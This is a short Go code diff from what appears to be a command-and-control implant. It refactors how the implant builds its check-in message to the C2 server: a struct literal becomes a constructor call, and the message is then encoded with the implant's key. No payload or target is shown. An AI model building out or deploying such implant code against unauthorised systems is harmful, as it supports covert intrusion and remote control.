@@ -68,12 +68,9 @@ func (imp *Implant) sendCheckin() {
 	}
 
 	dataBytes, _ := json.Marshal(checkinData)
-	result := &protocol.C2Message{
-		Module: "checkin",
-		Seq:    0,
-		Status: "ok",
-		Data:   string(dataBytes),
-	}
+	result := protocol.NewC2Message("checkin", 0)
+	result.Status = "ok"
+	result.Data = string(dataBytes)
 
 	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
 	if err != nil {
